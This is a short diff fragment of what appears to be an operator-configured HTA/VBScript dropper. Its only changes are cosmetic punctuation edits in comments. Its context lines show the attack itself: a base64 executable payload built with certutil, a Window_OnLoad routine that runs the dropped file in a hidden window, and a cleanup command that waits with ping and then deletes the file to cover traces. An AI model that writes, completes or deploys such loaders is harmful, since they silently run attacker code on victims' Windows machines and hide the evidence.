@@ -31,7 +31,7 @@
 ' Generate with: certutil -encode starburst.exe payload.b64
 ' Then paste the base64 content (without BEGIN/END CERTIFICATE lines) below
 Dim sBase64Payload
-sBase64Payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA" ' PLACEHOLDER — replace with full base64
+sBase64Payload = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAA" ' PLACEHOLDER - replace with full base64
 
 ' --- OPERATOR: Set output filename ---
 Dim sFileName
@@ -65,7 +65,7 @@ Sub Window_OnLoad()
     ' Execute the payload
     oShell.Run Chr(34) & sOutputPath & Chr(34), 0, False
 
-    ' Schedule cleanup — delete after a short delay to allow execution to start
+    ' Schedule cleanup - delete after a short delay to allow execution to start
     Dim sCleanupCmd
     sCleanupCmd = "cmd.exe /c ping -n 5 127.0.0.1 >nul & del /f /q " & Chr(34) & sOutputPath & Chr(34)
     oShell.Run sCleanupCmd, 0, False
